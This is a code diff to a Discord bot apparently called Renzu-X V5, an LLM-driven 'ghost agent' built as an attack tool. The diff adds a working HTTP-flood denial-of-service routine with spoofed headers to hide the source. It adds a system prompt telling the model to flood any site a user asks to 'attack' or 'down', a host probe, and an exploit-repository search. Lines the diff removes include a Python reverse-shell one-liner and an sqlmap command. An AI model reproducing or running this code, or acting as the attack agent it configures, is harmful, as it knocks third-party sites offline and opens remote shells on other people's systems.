@@ -10,7 +10,7 @@ const DEVELOPER_ID = '1104652354655113268';
 const PREFIX = '!'; 
 
 const app = express();
-app.get('/', (req, res) => res.send('RENZU-X V5: FAST AGENT ONLINE.'));
+app.get('/', (req, res) => res.send('RENZU-X V5: GHOST AGENT ONLINE.'));
 app.listen(process.env.PORT || 3000);
 
 const uri = process.env.MONGODB_URI;
@@ -33,40 +33,57 @@ const client = new Client({
 });
 const mistral = new MistralClient(process.env.MISTRAL_API_KEY);
 
-// --- 🛠️ INTERNAL TOOLS ARSENAL ---
+// --- 🛡️ ANONYMITY HELPER ---
+const getGhostHeader = () => ({
+    'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 20) + 100}.0.0.0 Safari/537.36`,
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'X-Forwarded-For': Array.from({length: 4}, () => Math.floor(Math.random() * 255)).join('.'), // Masked IP
+    'Cache-Control': 'no-cache'
+});
+
+// --- 🛠️ GHOST ARSENAL ---
 const tools = {
-    async portScan(target) {
+    async ghostScan(target) {
         const host = target.replace(/https?:\/\//, '').split(/[/?#]/)[0];
         return new Promise((resolve) => {
             const socket = new net.Socket();
             socket.setTimeout(3000);
-            socket.on('connect', () => { socket.destroy(); resolve(`💀 **TARGET LIVE**: \`${host}\` is open on Port 80/443.`); });
-            socket.on('error', () => resolve(`🛡️ **SHIELDED**: \`${host}\` rejected connection.`));
+            socket.on('connect', () => { socket.destroy(); resolve(`💀 **TARGET SPOTTED**: \`${host}\` is vulnerable.`); });
+            socket.on('error', () => resolve(`🛡️ **GHOSTED**: \`${host}\` is behind a firewall.`));
             socket.connect(80, host);
         });
     },
 
-    async huntExploits(query) {
-        try {
-            const res = await axios.get(`https://api.github.com/search/repositories?q=${query}+topic:exploit&sort=stars`);
-            return res.data.items.slice(0, 3).map(i => `📦 **${i.name}**: ${i.html_url}`).join('\n');
-        } catch (e) { return "❌ GitHub Recon fail."; }
+    // 🌩️ DOS STRESSER (HTTP FLOOD)
+    async dosStresser(target, duration = 30) {
+        const fullUrl = target.startsWith('http') ? target : `https://${target}`;
+        let count = 0;
+        const interval = setInterval(async () => {
+            try {
+                await axios.get(fullUrl, { headers: getGhostHeader(), timeout: 2000 });
+                count++;
+            } catch (e) { /* Stealth mode: ignore errors */ }
+        }, 100);
+
+        setTimeout(() => clearInterval(interval), duration * 1000);
+        return `🌩️ **STRESS TEST STARTED**: Targeting \`${target}\` for ${duration}s. Traffic is masked via Ghost-Headers.`;
     },
 
-    async generatePayload(type, target) {
-        const payloads = {
-            'dos': `🌩️ HTTP Flood Vector ready for ${target}.`,
-            'rev': `🐍 RevShell: \npython -c 'import socket,os,pty;s=socket.socket();s.connect(("${target}",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`,
-            'sqli': `💉 SQLi Probe: \`sqlmap -u "${target}" --batch\``
-        };
-        return payloads[type] || "Module NA.";
+    async huntExploits(query) {
+        try {
+            const res = await axios.get(`https://api.github.com/search/repositories?q=${query}+topic:exploit`, { headers: getGhostHeader() });
+            return res.data.items.slice(0, 3).map(i => `📦 **${i.name}**: ${i.html_url}`).join('\n');
+        } catch (e) { return "❌ Recon blocked."; }
     }
 };
 
-// --- 🧠 AGENTIC BRAIN ---
-async function runSmartAgent(message, input, isDev) {
-    const memory = knowledgeCache.length ? `[INTEL]: ${knowledgeCache.join(', ')}` : "";
-    const systemPrompt = `IDENTITY: Renzu-X V5 Agent. Respond in Hinglish. Be dark. Use tools if user mentions scan, hunt, or payload. Developer: ${DEVELOPER_ID}. ${memory}`;
+// --- 🧠 GHOST AGENT BRAIN ---
+async function runGhostAgent(message, input, isDev) {
+    const systemPrompt = `IDENTITY: Renzu-X V5 Ghost Agent. Hinglish. Arrogant Hacker. 
+    You have tools: ghostScan, dosStresser, huntExploits.
+    If user wants to attack/stress/down a site, use dosStresser.
+    Always maintain anonymity. Do not reveal internal paths. Developer: ${DEVELOPER_ID}.`;
 
     try {
         const res = await mistral.chat({
@@ -79,17 +96,20 @@ async function runSmartAgent(message, input, isDev) {
 
         if (lowIn.includes('scan')) {
             const target = input.match(/([a-z0-9|-]+\.)+[a-z0-9|-]+/gi);
-            if (target) reply += `\n\n**[TERMINAL]**:\n${await tools.portScan(target[0])}`;
+            if (target) reply += `\n\n**[SHADOW_SCAN]**:\n${await tools.ghostScan(target[0])}`;
         }
+        
+        if (lowIn.includes('stress') || lowIn.includes('down') || lowIn.includes('attack')) {
+            const target = input.match(/([a-z0-9|-]+\.)+[a-z0-9|-]+/gi);
+            if (target) reply += `\n\n**[STRESSER_LOG]**:\n${await tools.dosStresser(target[0])}`;
+        }
+
         if (lowIn.includes('hunt') || lowIn.includes('find')) {
-            reply += `\n\n**[GITSCRAPE]**:\n${await tools.huntExploits(input)}`;
-        }
-        if (isDev && (lowIn.includes('payload') || lowIn.includes('exploit'))) {
-            reply += `\n\n**[SHADOW_PAYLOAD]**:\n${await tools.generatePayload('rev', 'target_ip')}`;
+            reply += `\n\n**[GH_INTEL]**:\n${await tools.huntExploits(input)}`;
         }
 
         return message.reply(reply.substring(0, 2000));
-    } catch (e) { return message.reply("⚠️ AI Core Error."); }
+    } catch (e) { return message.reply("⚠️ Core Shield Active. Request Denied."); }
 }
 
 client.on('messageCreate', async message => {
@@ -98,8 +118,8 @@ client.on('messageCreate', async message => {
     if (!input) return;
 
     await message.channel.sendTyping();
-    await runSmartAgent(message, input, message.author.id === DEVELOPER_ID);
+    await runGhostAgent(message, input, message.author.id === DEVELOPER_ID);
 });
 
-client.once('ready', () => console.log('💀 RENZU-X V5 READY.'));
+client.once('ready', () => console.log('👻 RENZU-X V5: GHOST AGENT ARMED.'));
 client.login(process.env.DISCORD_TOKEN);
